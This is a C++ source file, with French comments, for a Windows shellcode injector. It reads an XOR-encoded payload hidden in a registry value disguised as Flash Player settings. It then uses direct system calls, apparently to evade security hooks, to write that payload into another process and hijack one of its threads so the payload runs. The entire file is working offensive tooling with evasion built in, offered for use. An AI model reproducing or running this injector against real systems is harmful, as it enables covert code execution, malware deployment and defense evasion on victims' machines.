#include <Windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <winreg.h>
#include "syscalls.h"

#pragma comment(lib, "Advapi32.lib")

#define REG_KEY   "Software\\Macromedia\\FlashPlayer"
#define REG_VALUE "Config"
#define XOR_KEY   0xAA

DWORD FindThreadInProcess(DWORD pid) {
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnap == INVALID_HANDLE_VALUE) return 0;

	THREADENTRY32 te;
	te.dwSize = sizeof(THREADENTRY32);
	DWORD tid = 0;

	if (Thread32First(hSnap, &te)) {
		do {
			if (te.th32OwnerProcessID == pid) {
				tid = te.th32ThreadID;
				break;
			}
			te.dwSize = sizeof(THREADENTRY32);
		} while (Thread32Next(hSnap, &te));
	}

	CloseHandle(hSnap);
	return tid;
}

// Lit la payload depuis le registre, la XOR-decode en mémoire.
// Retourne un buffer alloué (à libérer par l'appelant) + sa taille.
static unsigned char* LoadPayloadFromRegistry(SIZE_T* outSize) {
	*outSize = 0;

	HKEY hKey = NULL;
	LSTATUS ls = RegOpenKeyExA(HKEY_CURRENT_USER, REG_KEY, 0, KEY_READ, &hKey);
	if (ls != ERROR_SUCCESS) {
		printf("[-] RegOpenKeyExA failed: %ld\n", ls);
		return NULL;
	}

	DWORD size = 0;
	ls = RegQueryValueExA(hKey, REG_VALUE, NULL, NULL, NULL, &size);
	if (ls != ERROR_SUCCESS || size == 0) {
		printf("[-] RegQueryValueExA (size) failed: %ld\n", ls);
		RegCloseKey(hKey);
		return NULL;
	}

	unsigned char* buf = (unsigned char*)malloc(size);
	if (!buf) {
		RegCloseKey(hKey);
		return NULL;
	}

	ls = RegQueryValueExA(hKey, REG_VALUE, NULL, NULL, buf, &size);
	RegCloseKey(hKey);

	if (ls != ERROR_SUCCESS) {
		printf("[-] RegQueryValueExA (data) failed: %ld\n", ls);
		SecureZeroMemory(buf, size);
		free(buf);
		return NULL;
	}

	// XOR decode en place
	for (DWORD i = 0; i < size; i++) buf[i] ^= XOR_KEY;

	printf("[+] Payload lue depuis HKCU\\%s\\%s (%lu octets)\n", REG_KEY, REG_VALUE, size);

	*outSize = size;
	return buf;
}

int main(int argc, char* argv[]) {
	if (argc < 2) {
		printf("Usage: %s <PID>\n", argv[0]);
		return 1;
	}

	DWORD pid = (DWORD)atoi(argv[1]);

	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	PVOID rBuffer = NULL;
	SIZE_T bytesWritten = 0;
	ULONG oldProtect = 0;
	ULONG suspendCount = 0;

	SIZE_T payload_size = 0;
	unsigned char* buf = LoadPayloadFromRegistry(&payload_size);
	if (!buf || payload_size == 0) return 1;

	SIZE_T regionSize = payload_size;

	CLIENT_ID cid = { 0 };
	cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;

	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);

	NTSTATUS status = Sw3NtOpenProcess(
		&hProcess,
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
		&oa,
		&cid);

	if (status != 0 || hProcess == NULL) {
		printf("[-] NtOpenProcess failed: 0x%08lX\n", status);
		SecureZeroMemory(buf, payload_size);
		free(buf);
		return 1;
	}
	printf("[+] Handle to PID %lu: %p\n", pid, hProcess);

	DWORD tid = FindThreadInProcess(pid);
	if (tid == 0) {
		printf("[-] No thread found in target process\n");
		Sw3NtClose(hProcess);
		SecureZeroMemory(buf, payload_size);
		free(buf);
		return 1;
	}
	printf("[+] Target thread TID: %lu\n", tid);

	cid.UniqueThread = (HANDLE)(ULONG_PTR)tid;

	status = Sw3NtOpenThread(
		&hThread,
		THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
		&oa,
		&cid);

	if (status != 0 || hThread == NULL) {
		printf("[-] NtOpenThread failed: 0x%08lX\n", status);
		Sw3NtClose(hProcess);
		SecureZeroMemory(buf, payload_size);
		free(buf);
		return 1;
	}
	printf("[+] Thread handle: %p\n", hThread);

	status = Sw3NtAllocateVirtualMemory(
		hProcess,
		&rBuffer,
		0,
		&regionSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE);

	if (status != 0 || rBuffer == NULL) {
		printf("[-] NtAllocateVirtualMemory failed: 0x%08lX\n", status);
		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);
		SecureZeroMemory(buf, payload_size);
		free(buf);
		return 1;
	}
	printf("[+] Allocated %zu bytes at %p (RW)\n", payload_size, rBuffer);

	status = Sw3NtWriteVirtualMemory(
		hProcess,
		rBuffer,
		buf,
		payload_size,
		&bytesWritten);

	SecureZeroMemory(buf, payload_size);
	free(buf);
	buf = NULL;

	if (status != 0) {
		printf("[-] NtWriteVirtualMemory failed: 0x%08lX\n", status);
		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);
		return 1;
	}
	printf("[+] Wrote %zu bytes\n", bytesWritten);

	status = Sw3NtProtectVirtualMemory(
		hProcess,
		&rBuffer,
		&regionSize,
		PAGE_EXECUTE_READ,
		&oldProtect);

	if (status != 0) {
		printf("[-] NtProtectVirtualMemory failed: 0x%08lX\n", status);
		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);
		return 1;
	}
	printf("[+] Memory protection changed to RX\n");

	status = Sw3NtSuspendThread(hThread, &suspendCount);
	if (status != 0) {
		printf("[-] NtSuspendThread failed: 0x%08lX\n", status);
		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);
		return 1;
	}
	printf("[+] Thread suspended (previous count: %lu)\n", suspendCount);

	CONTEXT ctx;
	memset(&ctx, 0, sizeof(ctx));
	ctx.ContextFlags = CONTEXT_FULL;

	status = Sw3NtGetContextThread(hThread, &ctx);
	if (status != 0) {
		printf("[-] NtGetContextThread failed: 0x%08lX\n", status);
		Sw3NtResumeThread(hThread, NULL);
		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);
		return 1;
	}
	printf("[+] Original RIP: 0x%p\n", (PVOID)ctx.Rip);

	ctx.Rip = (DWORD64)rBuffer;

	status = Sw3NtSetContextThread(hThread, &ctx);
	if (status != 0) {
		printf("[-] NtSetContextThread failed: 0x%08lX\n", status);
		Sw3NtResumeThread(hThread, NULL);
		Sw3NtClose(hThread);
		Sw3NtClose(hProcess);
		return 1;
	}
	printf("[+] RIP redirected to 0x%p\n", rBuffer);

	status = Sw3NtResumeThread(hThread, NULL);
	if (status != 0) {
		printf("[-] NtResumeThread failed: 0x%08lX\n", status);
	}

	printf("[+] Thread resumed. Shellcode executing.\n");

	Sw3NtClose(hThread);
	Sw3NtClose(hProcess);

	return 0;
}
